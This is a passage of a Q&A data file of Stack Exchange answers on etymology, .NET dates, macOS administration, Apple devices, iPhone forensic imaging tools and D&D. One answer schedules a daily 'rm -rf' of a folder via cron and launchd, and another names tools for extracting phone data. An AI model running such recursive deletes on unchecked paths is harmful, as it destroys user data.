tendered minus cash paid equals change returned to the customer or the sum entered into the books as A/P.\nScenario 3\nIf the amount of cash tendered is less than amount owed, the business might accept this money. If so, A/R would be reduced by  the amount of cash tendered. Often the terms of the transaction will not allow cash tendered to be less than the amount due though! Examples are restaurant bills and installment payments e.g. credit card monthly charges or a mortgage payment. If so, none of the cash tendered by the customer will be accepted by the business. This is a scenario where cash tendered is greater than zero while cash paid is equal to zero.\n", "question_score": "9", "answer_score": 15}
{"title": "Origin of \"one man's trash is another man's treasure\"", "description": "This might be tough considering the gesture is iterated so many ways, but it's worth a shot. What is the origin of the expression one man's trash is another man's treasure?\n", "answer": "The earliest example I found in Google Books is in Hector Urquhart's introduction to 1860's Popular Tales of the West Highlands:\n\nPractical men may despise the tales, earnest men condemn them as lies, some even consider them wicked ; one refused to write any more for a whole estate ; my best friend says they are all ' blethers.' But one man's rubbish may be another's treasure, and what is the standard of value in such a pursuit as this?\n\nThe concept of something having contradictory qualities to different people has been around a long time. \"One man's meat is another man's poison\" was a 17th century proverb.\nThough clearly not the origin of such concepts, here are some 17th-18th century versions. The 1703 The Athenian Oracle: Being an Entire Collection of all the Valuable Questions and Answers in the Old Athenian Mercuries refers to both One's man's pleasure is another's pain and a proverb One's man's meat is another's poison. This book is a bound publication of The Athenian Mercury which ran from 1690 to 1697.\nIt refers to them in an answer discussing these contrasts and our \"perception of what's agreeable to our Natures\", or disagreeable. The same could apply to trash/treasure.\n\nQ. What's Pleasure ? What's Pain ?\nA. We Answer to both, that 'tis not easie to describe 'em, tho' so easie to know 'em -- and perhaps generally speaking, the more sensible and obvious any thing is, the more a Man may be to seek for a clear Philosophical Notion of it; Science being many removes from singular and sensible Objects, tho' grounded upon them. Besides, what's one man's pleasure is, another's pain, or according to the Proverb, Meat, Poison, and so of the other Senses -- And agen, Pleasure is certainly in some Cases, nothing but Privation of Pain (as Ease after a violent Fit of the of the Stone or Tooth.ach) and the very formality of Pain generally made something Privative or Negative, namely the absence of what's good or pleasant. For a general Description of'em both, which may reach all the Species, and include both body and Mind, we think this following may do -— Pleasure is a perception of what's agreeable to our Natures ---- and Pain, just the contrary, of what's disagreeable or inconvenient -— If any say, this is no more than Pleasur' pleasure, and  Pain is pain, we would be oblig'd to them for a more clear and general notion of both those Affections than we have here given.\n\nJust a few years later in 1706 is Several sermons upon the fifth of St. Matthew:\n\nThat a thing which is a Sin to one is a Blessing to anther, no more than we count it a Solecism to say, that what is one Man's Meat is another Man's Poison.\n\nAnd the next year, 1707's A General Treatise of Monies and Exchanges three times gives us a similar phrase to the junk:treasure comparison, in the context of the net wealth of the nation/kingdom/commonwealth remaining the same:\n\n... one private Man's loss in that Case is another private Man's Profit, ...\nfor one Man's loss becones another Man's Gain;\nVery true, Sir, one Man's loss is another Man's Profit;\n\nSome other variations from the early 18th century:\n\nWilliam De Britaine's 1717 Humane Prudence: \"One Man's Fault is another Man's Lesson\"\n\nDaniel Defoe's 1719 The life and surprising adventures of Robinson Crusoe of York, mariner: \"Thus, what is one man's safety is another man's destruction\"\n\nThomas Brown, James Drake, Aristaenetus' 1720 The Works of Mr. Thomas Brown: \"One Man's oversight is always another's Gane.\"\n\nNicholas Brady's 1730 Several Sermons: \"Estates here often shift their Landlords, and what is one Man's to Day1 is another's To-morrow;\"\n\nWilliam Ellis's 1737 The London and country brewer: \"But according to the Proverb, One Man's Mistake, is another's Game.\"\n\nEdward Young's 1741 Love of fame, the universal passion: \"How one man's anguish is another's sport,\"\n\nA Lady's 1741 The history of Portia: \"See what the World is ! one Man's Death is another Man's Joy\"\n\nLeonhard Culmann's 1741 Sententiæ pueriles: \"One man's weal is another man's bane. One man's wealth is another man's plunder.\"\n\n", "question_score": "9", "answer_score": 10}
{"title": "Where does the phrase \"in good nick\" come from?", "description": "The term \"in good nick\" meaning \"in a good condition\" came up in conversation and I realised I had no idea where it came from. \nSearching online seems surprisingly fruitless- there are several roots for nick as it is used in different contexts but none of them to explain why it came to mean \"condition.\" \nThe closest thing I can see is \"in the nick of time\" where nick derives from the same root as \"notch\" or \"niche\", but that doesn't seem to connect directly to a mark of quality or condition unless it comes from marking notches to measure time (which the \"nick of time\" seems to derive from) and means \"in good condition for its age\" which is an interesting conjecture with, so far as I can tell, no substantiating evidence.\nDoes anyone have any clear origin for the term?\n", "answer": "Andrew Leach's answer has the OED's first quotations [parenthetically in 1884, and] in 1890. Their first quotation for \"in good nick\" is The English dialect dictionary from 1905.\nAustralia, 1880s\nI found earlier uses in the Trove archive of Australian newspapers, the earliest in The Referee (Sydney, NSW, Thursday 13 January 1887):\n\nHutchens and Samuels.\n(By \"Shoespike.\")\nNext Monday Hutchens will run his first\nmatch in Australia. Malone's was to have\nbeen the first, but the aboriginal party\nwere found willing to risk a century, and\na match was quickly made. Samuels has\nnot had much time for preparation, but is\nquietly doing work on the Agricultural\nGround. He looks if anything fine, and\nnot so strong and in such good \"nick\" as\nwhen he won the Botany. As an aboriginal\nSamuels is a first-rate runner, and about\nthe best of them. I question, however, if\nhe is class enought to stretch the world's\nchampion and anticipate Hutchens to\nwin comfortably. I may add I do not\nexpect even time to be broke.\n\nIt was used in other Australian newspapers in the late-1880s to describe sporting participants: wrestlers, racehorses, footballers, boxers rowers.\nNew Zealand, 1870s\nHowever, it can be found earlier in New Zealand's archive of newspapers, Papers Past, and again in a sporting context. First in Sporting Notes by \"Sinbad\" in The Press (Volume XXIX, Issue 3973, 18 April 1878, Page 3), describing racehorses:\n\nYork, the representative of the Bay stable, is big enough and strong enough. Those who ought to know say he has plenty of pace, and will certainly be there or thereabouts at the finish. He is without doubt in good nick, and will have a good man on his back, so I think he will run into a place, and if either Natator or Merlin are out of it he may be labelled dangerous.\n\n(The article also uses the similar phrase in good form.) In good nick shows up in many other editions of The Press and also The Obago Witness in the late-1870s, all applied to racehorses.\nAn origin?\nAnother meaning of the noun nick dates from 1824 and, according to the OED:\n\n10. An instance of cross-breeding, esp. one which produces offspring of high quality.  Cf. nick v.2 7b.\n\nYou could say of animals or racehorses, as in this from an 1870 Australian newspaper:\n\nIt is possible,\nhowever, as the mare is a daughter of Melbourne, that\nStockowner may prove a good nick.\n\nFrom the same article, as a verb:\n\nI see that a certain sire and dam \"nick\" well, no\nmatter how wrong it may be for them to do so, as far as\nthe relationship of their families is concerned, I prefer\nto trust to their progeny, rather than to thoso bred on a\ncorrect theory without practical results.\n\nSo perhaps as the term for successfully crossed animals, specifically racehorses, was applied to racehorses generally in good form. This was then used for sportsmen in general before being used for anything in good condition, or conversely, as \"in poor nick\" for something in bad condition or form.\n", "question_score": "9", "answer_score": 10}
{"title": "What is the sense of using word \"argument\", for inputs of a function?", "description": "In computer jargon, we refer to \"inputs of a function\" as \"arguments\". I was wondering what the sense is in doing so.\n", "answer": "The computing use comes directly from mathematics, where, according to the OED, it is:\n\nMath. and Computing. An independent variable of a function (e.g. x and y in z = f(x, y)).\n\nTheir first use in maths:\n\n1865   W. T. Brande & G. W. Cox Dict. Sci., Lit. & Art I. 768   Any trigonometrical function of ϕ is termed an elliptic function, having the argument u and modulus k.\n\nThis meaning can be traced back to an earlier sense:\n\n2. Astron. and Math. The angle, arc, or other mathematical quantity, from which another required quantity may be deduced, or on which its calculation depends.\n\nIt's first recorded in Chaucer around 1400. The third sense (also first recorded in the same Chaucer) is:\n\n3. A statement or fact advanced for the purpose of influencing the mind; a reason urged in support of a proposition; spec. in Logic, the middle term in a syllogism. Also fig.\n\nAnd for good measure, the first sense is:\n\nProof, evidence, manifestation, token. (Passing from clear proof in early, to proof presumptive in later usage; cf. argue v. 3) arch.\n\nThere are some eight various senses altogether.\nSo, an argument is a fact or something that drives forward reasoning, or the output of a calculation, a mathematical function or computing function.\n", "question_score": "9", "answer_score": 13}
{"title": "How can I describe a \"one or more\" condition (one that has many options; a \"non-boolean\")?", "description": "Generally speaking a boolean condition is understood to be an \"either/or\" relationship; for example, something is hot or cold.\nWhat's do you call a \"one or more\" condition, e.g. something that can have many colors?\nTo add a bit of clarification, in conversation most people understand Boolean to be an \"either/or\" proposition, whether there are two or more conditions, as when you ask someone to pick a single color of paint (red, green, or blue).\nWhen discussing that with non-programmers, I find they perfectly understand that when I describe it as a boolean condition.\nHowever, I don't seem to know what to call a \"one or more\" condition, for example, \"pick any colors that you like: red, green, blue, yellow, orange, purple.\"\nI find my self saying \"non-boolean\" which isn't all that useful.\n-- EDIT --\nRubergly's answer gave me an interesting thought:\nBoolean is similar to \"dichotomous\" and also similar to \"binary\" (1 or 0). Trinary means set of three... so is \"polynary\" a word, or is there something similar?\n", "answer": "There are many existing terms for a number possible concepts that you might be using:\n\nif you are talking about a question/situation that has one outcome (functional) out of many distinct choices, like one out of many but a finite set of colors, then it is discrete or nominal (the latter technical for statistics).\nif you are considering a situation where you get many results at once, like red, blue, and green together from the rainbow, then it is multivalued, a subset, a tuple, or n-ary (the latter 3 are technical). 'n-ary' is probably not in any nontechnical dictionary but is in wide use in mathematical language.\n\nThere's a lot of technical math vocabulary that may or may not be appropriate in informal conversation; one can consider the kinds of values returned (as in computer programming the type like boolean, int, or real) and also the number of different values returned (for a person - height, eye color, handedness). Here is a small taxonomy: \n\nnumber of values returned\n\nsingle value = functional\nmultiple value = relational (or multivalued)\n\na given set number of values returned is fixed arity \nvariable being n-ary or polyadic (multivariate for arguments, __multivalued for results),  \n\nthe range/possibilities of a given single value\n\ncontinuous \ndiscrete, and discrete has a number of words to describe variations (binary, boolean, dichotomous, nominal, integral, combinatorial) \n\n", "question_score": "8", "answer_score": 14}
{"title": "Strong verbs, weak verbs, and other categories", "description": "For verb conjugations, I know that in English we have certain verbs which umlaut ablaut in their principle parts:\n\nsing-sang-sung\n\nWe have verbs that add an -ed to the end:\n\nlaugh-laughed\n\nand then there are verbs which just don't change at all:\n\ncut, put etc.\n\nSo which of these verbs are strong, or weak, or have a different category altogether?\n", "answer": "Verbs which demonstrate ablaut (like sing-sang-sung) are called strong verbs.  Wikipedia:\n\nIn the Germanic languages, a strong verb is one which marks its past tense by means of ablaut. In English, these are verbs like sing, sang, sung. The term \"strong verb\" is a translation of German \"starkes Verb\", which was coined by the linguist Jacob Grimm and contrasts with the so-called \"weak verb\" (\"schwaches Verb\") which forms its past tense by means of a dental suffix.\n\nVerbs whose past tense form and participial form make use of the regular -ed/-d/-t ending (like laugh-laughed-laughed) are called weak verbs, and a majority of those are also regular verbs.  Wikipedia on weak verbs:\n\nIn Germanic languages, weak verbs are those verbs that form their preterites and past participles by means of a dental suffix, an inflection that contains a /t/ or /d/ sound or similar. (For comparative purposes we may refer to this generally as a dental, although in some of the languages, including most varieties of English, /t/ and /d/ are alveolar rather than dental consonants.) In all Germanic languages, the preterite and past participle forms of weak verbs are formed from the same stem.\n\nVerbs like cut and put are categorized in this list of irregular verbs as \"weak with assimilation of dentals\".  So their past tense and participial forms have an invisible -ed ending which has been linguistically assimilated (i.e. swallowed up into the t at the end of the word).\n", "question_score": "8", "answer_score": 10}
{"title": "Is there any difference between \"famous\" and \"popular\"?", "description": "Is there any difference between famous and popular?\n", "answer": "Generally, famous refers to recognition, and popular refers to reputation (of a person) or frequency (many people use a thing or visit a place).\nFamous often, but not necessarily, has positive connotations. Knowledge of the famous person, thing or event is widespread.\nPopular usually has positive connotations, or when referring to a place, it means it is visited by many people. The person, place or thing is largely well regarded among the people who know of it, but doesn't necessarily mean a lot of people know of it.\nPerhaps it's easier understood with an example.\n\nA famous restaurant: Is well known. The name of the restaurant is recognized, perhaps because a well-known chef founded it, or it advertises a lot, or a well-known event occurred on the premises.\nA popular restaurant: It's usually busy. The majority of people enjoy eating there. Or maybe they don't, but they go there because the food is cheap, or it's the \"place to be.\" Outside of the people that eat there, it may or may not be well known.\n\nA restaurant can be both famous and popular (everyone knows about the restaurant, and many of them go there), or popular but not famous (only the people that frequent the restaurant know of it), or famous but not popular (making it infamous).\n", "question_score": "8", "answer_score": 14}
{"title": "How to convert unix timestamp to .NET DateTime", "description": "What is the format of the \"creation_date\" that is returned from a search of questions? I've been looking all over here and can't figure it out. I want to convert it to a regular DateTime object.\nI am using Json.NET but since I don't know the format I'm looking for it's difficult.\nAre there any code snippets out there?\n", "answer": "This is a take on a class that has been floating around for a while. I first saw it in kevin's first api.\nYou can use this on all values that are declared as 'unix timestamp', both request and response\n    ///<summary>\n    ///</summary>\n    public static class UnixDateTimeHelper\n    {\n        private const string InvalidUnixEpochErrorMessage = \"Unix epoc starts January 1st, 1970\";\n        /// <summary>\n        ///   Convert a long into a DateTime\n        /// </summary>\n        public static DateTime FromUnixTime(this Int64 self)\n        {\n            var ret = new DateTime(1970, 1, 1);\n            return ret.AddSeconds(self);\n        }\n\n        /// <summary>\n        ///   Convert a DateTime into a long\n        /// </summary>\n        public static Int64 ToUnixTime(this DateTime self)\n        {\n\n            if (self == DateTime.MinValue)\n            {\n                return 0;\n            }\n\n            var epoc = new DateTime(1970, 1, 1);\n            var delta = self - epoc;\n\n            if (delta.TotalSeconds < 0) throw new ArgumentOutOfRangeException(InvalidUnixEpochErrorMessage);\n\n            return (long) delta.TotalSeconds;\n        }\n    }\n\nAnd here is a JSON.net converter that you can use to automagically deserialize your json.\nI swiped this from Luke Foust's Stacky and fixed it up for use in current versions of JSON.net \n    /// <summary>\n    ///   Useful when serializing/deserializing json for use with the Stack Overflow API, which produces and consumes Unix Timestamp dates\n    /// </summary>\n    /// <remarks>\n    ///   swiped from lfoust and fixed for latest json.net with some tweaks for handling out-of-range dates\n    /// </remarks>\n    [CLSCompliant(false)]\n    public class UnixDateTimeConverter : DateTimeConverterBase\n    {\n        //public override object ReadJson(JsonReader reader, Type objectType, JsonSerializer serializer)\n        //{\n        //    if (reader.TokenType != JsonToken.Integer)\n        //        throw new Exception(\"Wrong Token Type\");\n\n        //    long ticks = (long)reader.Value;\n        //    return ticks.FromUnixTime();\n        //}\n\n        /// <summary>\n        /// Writes the JSON representation of the object.\n        /// </summary>\n        /// <param name=\"writer\">The <see cref=\"T:Newtonsoft.Json.JsonWriter\"/> to write to.</param><param name=\"value\">The value.</param><param name=\"serializer\">The calling serializer.</param>\n        public override void WriteJson(JsonWriter writer, object value, JsonSerializer serializer)\n        {\n            long val;\n            if (value is DateTime)\n            {\n                val = ((DateTime) value).ToUnixTime();\n            }\n            else\n            {\n                throw new Exception(\"Expected date object value.\");\n            }\n            writer.WriteValue(val);\n        }\n\n        /// <summary>\n        ///   Reads the JSON representation of the object.\n        /// </summary>\n        /// <param name = \"reader\">The <see cref = \"JsonReader\" /> to read from.</param>\n        /// <param name = \"objectType\">Type of the object.</param>\n        /// <param name = \"existingValue\">The existing value of object being read.</param>\n        /// <param name = \"serializer\">The calling serializer.</param>\n        /// <returns>The object value.</returns>\n        public override object ReadJson(JsonReader reader, Type objectType, object existingValue,\n                                        JsonSerializer serializer)\n        {\n            if (reader.TokenType != JsonToken.Integer)\n                throw new Exception(\"Wrong Token Type\");\n\n            long ticks = (long) reader.Value;\n            return ticks.FromUnixTime();\n        }\n    }\n\n.\nYou would use this by decorating a field or property in your deserialization type like so:\n/// <summary>\n///   date this question was locked\n/// </summary>\n[JsonConverter(typeof (UnixDateTimeConverter))]\n[JsonProperty(\"locked_date\")]\npublic virtual DateTime LockedDate\n{\n    get { return lockedDate; }\n    set\n    {\n        NotifyPropertyChanged(\"LockedDate\");\n        lockedDate = value;\n    }\n}\n\n", "question_score": "15", "answer_score": 12}
{"title": "Alternatives for Tree structure", "description": "\nPossible Duplicate:\nWhat's the best way to view a deep hierarchy? \n\nIn a desktop application what are the innovative, alternate methods to a tree structure? \nProvide me some example links to go through. \n", "answer": "For arbitrary numbers of levels:\n\nCascading windows\n\nThere are numerous possible presentations of tree hierarchies.  The variants shown below are all from http://vis.stanford.edu/protovis/ex/, which is web based, but nothing stops the algorithms being used to render hierarchies in a desktop application:\n\nGoogle's Image Swirl is a web based tree browsing of images - similar presentation could be used for a desktop application - and in any case a web browser is a desktop application.  Modern application development tools can make including a browser window in an application a good choice.\n\nThe Open Source Walrus Program provides interactive 3D visualizations of very large trees.\n\nAny method for showing networks can equally show a tree, because a tree is just a network with the least links necessary to stay connected in one piece.\n\nGraphViz can be used to generate displays of trees of all kinds.  This circular example below is for visualizing the hailstone sequence.  Another program, Circos, specializes in diagrams in a circular format, and as well as networks can also show tree structured data.\n\nMenus are a form of tree.  So are menus in disguise like Microsoft's Ribbon.\n\nMiller Columns\n\n(source: google.com)\nFor one or two levels:\n\nAccordions\n\nTabbed control\n\nOne nested inside the other to get to two levels.\n\nFor a small fixed number of levels\n\nA table with a column for each level, each row representing one leaf node and giving the full breadcrumbs-path to the node represented.\n\nTable using indents\n\nMost of the methods in Tag-wiki Master Details\n\nOther examples are in topics discussed under hierarchy such as What's the best way to view a deep hierarchy?\n\n", "question_score": "9", "answer_score": 13}
{"title": "Do MacBooks have a true \"Hibernate\" option?", "description": "I've recently switched from Windows to a MacBook pro. In Windows, there are the following shutdown options:\n\nStandby - the machine goes into a \"light sleep\" from which it can awaken very quickly (like, in a few seconds), but plenty of energy is consumed.\nHibernate - the OS dumps the current system state (including the contents of the RAM) to a file, then turns the machine off. Wakeup takes longer than from standby, but there is no latent energy consumption. \nShut down - the OS shuts down, and the machine is turned off. \n\nIn OS X, what I can see is\n\nSleep - seems equivalent to standby, or an even lighter form of sleep as Mail seems to even continue to poll for new email? \nShutdown and restore all apps on next start - turns off machine, seems to start the OS from scratch and restart alls apps - from what I can tell, it's not hibernation\nShutdown and don't restore apps - shut down\n\nis this correct, and does OS X not have a true \"hibernate\" mode that can write its state to disk? Because that's what I'm looking for really. There's talk of a \"Safe Sleep\" mode on the Internets, but I can't see it in my OS X menu. Is it hidden in 10.7?\n", "answer": "When newer laptops are put to sleep, they should save the contents of the RAM to /var/vm/sleepimage but keep the RAM powered as well. Desktop Macs should just use normal sleep mode by default.\nman pmset:\nhibernatemode = 0 (binary 0000) by default on supported desktops. The\nsystem will not back memory up to persistent storage. The system must\nwake from the contents of memory; the system will lose context on power\nloss. This is, historically, plain old sleep.\n\nhibernatemode = 3 (binary 0011) by default on supported portables. The\nsystem will store a copy of memory to persistent storage (the disk), and\nwill power memory during sleep. The system will wake from memory, unless\na power loss forces it to restore from disk image.\n\nhibernatemode = 25 (binary 0001 1001) is only settable via pmset. The\nsystem will store a copy of memory to persistent storage (the disk), and\nwill remove power to memory. The system will restore from disk image. If\nyou want \"hibernation\" - slower sleeps, slower wakes, and better battery\nlife, you should use this setting.\n\n0 (traditional sleep mode): fast wake up and sleep, saves disk space\n3 (default safe sleep mode): fast wake up and sleep, state is kept when losing power\n25 (hibernation): saves energy, state is kept when losing power\n\nYou can see which mode your Mac uses with pmset -g | grep hibernatemode and change it with sudo pmset -a hibernatemode $mode.\nSome newer Macs support a standby mode on 10.8 and later. Even if hibernatemode was set to 3, they power off memory after a bit over an hour of sleep.\n", "question_score": "95", "answer_score": 63}
{"title": "Automatically delete a folder daily", "description": "Is there a way to automatically have a folder deleted every day at 4am?\nI'm running 10.6.7.\n", "answer": "Appplescript & iCal\nOpen Applescript and enter the following code:\ntell application \"Finder\"\n  delete folder \"folder\" of home\nend tell\n\nReplacing folder with the folder you want to delete, and save the file.\nIf the folder you want to delete is outside home directory, (for example the folder /Users) then replace the delete line with:\ndelete folder \"Users\" of startup disk\n\nThen open iCal and create a new recurring event at the time you want and as an alarm choose Run Script and select the applescript you created.\n\nCron\nOpen Terminal.app and enter:\ncrontab -e\n\nThere to the file opened, add the following line\n0    4       *       *       *       rm -rf /Users/USER/folder\n\nreplacing /Users/USER/folder with the full path of your folder and save the file.\n\nLaunchd\nCreate a new text document, and paste the following code:\nrm -rf /Path/to/Folder\n\nLet's call it script.sh\nBased on this article, create another new text document and paste the following:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n  <string>Recurring Folder Deletion</string>\n  <key>UserName</key>\n  <string>nuc</string>\n  <key>Program</key>\n  <string>/path/to/script.sh</string>\n  <key>StartCalendarInterval</key>\n  <dict>\n    <key>Minute</key>\n    <integer>0</integer>\n    <key>Hour</key>\n    <integer>4</integer>\n  </dict>\n  <key>Debug</key>\n  <false/>\n  <key>AbandonProcessGroup</key>\n  <true/>\n</dict>\n</plist>\n\nReplace nuc with your account username, and /path/to/script.sh with the full path of the script we created on first step.\nSave the file in /Library/LaunchDaemons/ as my_rfd.plist.\nFinally, launch Terminal.app and type:\nlaunchctl load /Library/LaunchDaemons/my_rfd.plist\n\n", "question_score": "9", "answer_score": 18}
{"title": "how to revert default Mac Apache install to original", "description": "I've had major issues with my default Apache install ever since I installed MAMP. I've uninstalled MAMP now but I'm still getting issues such as multiple Apache processes running, not stopping/starting/restarting, and the Web Sharing option not showing the correct state in System Preferences. I'm assuming MAMP has changed something within the default version of Apache, is there any way to easily replace the entire Apache install?\nThanks, Alex\n", "answer": "Has another Apache been installed? From a terminal (Applications-> Utilities-> Terminal.app) try:\n\nps ax | grep httpd\n\nYou should see something like the following if your local web sharing is enabled:\n\n25829   ??  Ss     0:00.04 /usr/sbin/httpd -D FOREGROUND -D WEBSHARING_ON\n25831   ??  S      0:00.00 /usr/sbin/httpd -D FOREGROUND -D WEBSHARING_ON\n\nThen try\n\nps ax | grep apache\n\nThis should return nothing if you are using the default install, but might if another server was installed.\nIf apache is running from anything other than /usr/sbin, then you may want to investigate your PATH environment variable in case it has been altered.\nYou could also try using the default httpd.conf file supplied by Apple (in case yours has been edited).\n\nMake a backup of the current one\n\nsudo cp /etc/apache2/httpd.conf /etc/apache2/httpd.conf.bak\n\nCopy the 'original' httpd.conf file\n\nsudo cp /etc/apache2/original/httpd.conf /etc/apache2/httpd.conf\n\nRestart the web server\n\nsudo apachectl restart\n\nOn a side note.. If you are or will be doing any long term web development, I would advise installing apache2, php, mysql, etc from MacPorts or Homebrew. There is a little bit of a learning curve, but it's easy when you get the hang of it and you will benefit over the long haul. Example port commands:\nSearch for applications to install\n\nport search apache2\n\nInstall apache2\n\nsudo port install apache2 (currently version 2.2.22)\n\nUninstall apache2\n\nsudo port uninstall apache2\n\nUpgrade..\n\nsudo port upgrade apache2\n\nAlso, MacPorts installs everything into the /opt/ directory (I think Homebrew does as well), so you can always just delete the entire directory if you do not want them anymore. Again, if you do not mind digging in the trenches a bit and can be patient while your computer compiles these apps from source code (this can be lengthy), it will be worth your while.\n", "question_score": "9", "answer_score": 11}
{"title": "How do I connect a Mac to an analog TV?", "description": "Is it possible to connect my MBP with a Thunderbolt port to an old CRT TV? I think the TV has composite inputs at least, and maybe S-Video too.\nI'd also like to use other computers with the same TV, including one with a Mini DisplayPort and one with a DVI output (I think).\nI do video-editing and it's helpful to see my work on a TV.\n", "answer": "The latest Mac models with either Thunderbolt or Mini DisplayPort can't directly output composite/S-Video (older Macs with micro-DVI could do this when using the right adapter).\nTherefore you need a converter box (powered via USB or separate power supply) that takes a VGA signal and converts it to composite or S-Video, which can be connected to the TV. You need to get one that can supply the correct video signal for your TV (PAL/NTSC/SECAM), although most will support all of those. These converters are available in a wide price range - generally the more expensive, the better the quality (of the signal).\n\nYou will also need a Mini DisplayPort to VGA adapter to get a VGA signal from your Mac (this also works with the Thunderbolt MBP). For the computer with DVI output you will hopefully have a graphics card that can output a VGA signal, in which case you merely need a DVI to VGA adapter. If it outputs only DVI, you're in trouble, as you'll need another converter that converts this digital signal to a VGA one.\nAlternatively you could get a USB graphics card that outputs TV signals directly, although I can't seem to find one right now. This would be act like an additional monitor, which may be preferable.\nIn case your TV has SCART inputs (Europe mostly) instead of composite/S-video, you'll also need a SCART adapter, although this may be included with some of the products mentioned above.\nThe whole setup would look like this:\nMac -> Mini DisplayPort to VGA adapter -> Converter box -> [SCART adapter] -> TV\n\n", "question_score": "9", "answer_score": 11}
{"title": "How can I delete my Mail App and re-install it?", "description": "My mail app does not give me a viewer window and all File options are greyed out & not available.\niMac 3.06 intel core 2 Duo OS X 10.9.4\nMail opens in this state. I have created new user accounts and same problem exists. I have tried all suggestions, thanks, but still no joy.\nWhen I re-installed OSX all data remained.\nIt worked normally in Safe mode. \n", "answer": "Before you delete it, see if you can repair Mail.\n\nIn Mail, go to Window → Connection Doctor and let it verify your connections to see if all works there.\nNext step is to rebuild your Mail database. Go to the Mailbox tab and at the bottom click on Rebuild.\nIf 1 and 2 are not accessible (grayed out)\nTry to reset Mail settings. - which you will need to set up after following:\nQuit Mail, then go to Finder and press ⇧⌘G and enter (or copy) the following:\n~/Library/Containers/com.apple.mail/Data/Library/Preferences\n\nLook for \"com.apple.mail.plist\" and drag it the Desktop, then restart Mail.\n\nAlternatively, you can use this one-liner in your Terminal app (located in the Utility folder):\nkillall Mail &> /dev/null; mv ~/Library/Containers/com.apple.mail/Data/Library/Preferences/com.apple.mail.plist ~/Desktop && open -a Mail\n\nSource: http://georgegarside.com/o/se/resetMail.html\n\nIf all else fails you can reinstall the operating system (Mavericks) that includes the Mail.app. Boot into the Recovery HD with ⌘R, then follow the instructions.\nFor more information about recovering a broken Mail.app, see this:\n\nhttp://www.techrepublic.com/blog/apple-in-the-enterprise/how-to-recover-email-from-apple-mail-corruption/\n\nYou can check if a 3rd party app/extension is causing the problem by performing a safe boot (hold shift on boot).\nIn rare occasions your user permissions or ACLs might need some repair. This answer describes the process.\n", "question_score": "9", "answer_score": 10}
{"title": "What can a 1st gen Apple TV do than a new Apple TV cannot?", "description": "I have a 1st gen one and I'm thinking about selling it to get a new one.\nPeople on ebay seem to want the old one.\nWhy are 1st gen Apple TVs selling on ebay for over $100 while a new Apple TV is sold for $99?\n", "answer": "The only super major differences the 1st Gen Apple TV's has from the new ones is the ability to store Movies, Music, Content, etc because they have a physical hard drive in them for doing those things.  The other things is that they can connect to TV's through Red, Blue, Green Component Cables.  They also do not support Airplay with out a hack or a software fix. Also, the newest Apple TV, the 3rd Gen, allows for 1080p HD playback, where the older ones only support 720p HD playback. \nThere are also a few other minor differences in size, power consumption, software options/OS and so on.\nThe new Apple TV's do not have hard drives or Component Cable outputs and support Airplay out of the box. Airplay is probably the biggest feature that makes people who don't want to hack to jump ship to the newer box.  It is pretty cool. The 1080 HD playback is nice, but depending on your TV, may or may not be noticeable/important. \nSome people like the older ones also because they can be hacked and used as linux computers (link) with actual storage and since they can also store things on them, you can take it with you and have videos/music on it and not require internet for streaming your content. \nThough the biggest reason is most likely the hack-ability of them, they are tiny computers with a decent amount of power. And since they aren't sold any more and are still sought after, that would explain their above average price. \nThe new Apple TV's require internet of some kind or at least a local network for stream video and movies and data from a computer or the internet.  \nThey are also significantly smaller too, the older Apple TVs are much larger.\nYou can see all the differences on their wiki page, it lays out the differences in features between the devices and even talks about most of the hacks that are available. Very informative.\nhttp://en.wikipedia.org/wiki/Apple_TV\nI hope that this answer helps you out.\n", "question_score": "9", "answer_score": 10}
{"title": "Clone all of an iPhone's data", "description": "I'm looking for a way to copy all of the data from my iPhone to a Windows PC, with accuracy down to the byte that could be used for forensic purposes. The iPhone in question is an iPhone 6 running iOS 9.3 and is not jailbroken.\nIs there any software (the cost of which is not important) that would do just that? Basically, I'm wondering how the FBI did it.\nThe output file is NOT important. Even if it's all encrypted, it's ok—it just must be every single byte that can be taken off the phone (a complete copy of the iPhone's hard disk).\nCould iTunes do this based on the presumption that nothing is left behind when iTunes+Windows makes an iPhone backup?\n", "answer": "In a sense there are multiple answers to your question.\nLaw Enforcement\nYou asked how the FBI did it. In a nutshell you won't get an answer here as they paid a huge sum of money to obtain the vulnerability, which in itself only applied to a particular model of iPhone running a specific version of iOS. So the approach the FBI used most likely wouldn't work for you, but even if it did, no-one is going to be able to tell you how they did it.\nLaw enforcement also uses a tool developed by Zdziarski five or so years back, however current versions are not available to the public. Even if you could source one of the earlier versions originally available to the public, this is not likely to work with iOS 9.3.\nForensic options\nThere are a number of forensic options available, none of which are cheap. However, since you stated that the cost isn't important, here's a few you may find of interest:\n\nLantern 4 - US$1,999 up front, US$800 annual maintenance\nSpotlight - US$2,000 up front, plus the cost of compulsory training\nUFED - There are a whole range of options/versions available\n\n'Disk Image'\nOnce you have your disk image of the iPhone you will need analysis tools that are capable of connecting to and analysing a mounted iOS image. In your case you're likely to find that some of the open source community tools are powerful enough for a search and retrieval investigation. Here is a list of some of these tools for you to research:\n\nScalpel\nDD\nFind\nStings\n\niTunes backups\nIn terms of whether iTunes will perform a full bit-by-bit backup, the answer is no. Even selecting the \"Encrypt local backup\" option will not result in a full backup, although it will capture account passwords, Health data, HomeKit data and various other additional files not usually included in the backup.\n", "question_score": "9", "answer_score": 11}
{"title": "How do you make a dragon player character in D&D 3.5?", "description": "Me and a friend were looking at the rules in Draconomicon to make a Dragon PC and we were still baffled four hours later because of the dragon aging and leveling-up processes. Can anyone explain these rules in a simpler way (not to insult anyone's intelligence on how they believe they are easy) or suggest an alternate leveling method?\n", "answer": "Like any monster PC, you have hit dice and level adjustment, and progress by taking character class levels. The difference is that when a dragon PC hits the age listed, he is required to take his next level in his Dragon progression (Table 3-21) instead of a normal character class.\nCreating a dragon PC\nAs per the standard monster PC rules, you begin with the following:\n\nDragon hit dice, each granting 1d12 HP, +1 base attack, 6 + Int modifier skill points, and saving throws equivalent to a monk of your HD. Remember that you get maximum hit points for the first HD and 4x skill points for your first level, as normal.\nSize, space/reach, speed (including flight., etc), natural weapons, natural armour and special abilities as a wyrmling of your dragon type, as described in the dragon section of the Monster Manual. Read the entry carefully, as you get quite a lot to begin with. Take note of how the saving throw DCs for abilities like breath weapon are calculated: they will increase as you gain dragon HD.\nAbility score modifiers. Subtract 1 from odd-numbered ability scores from the wyrmling line in the monster description, then subtract 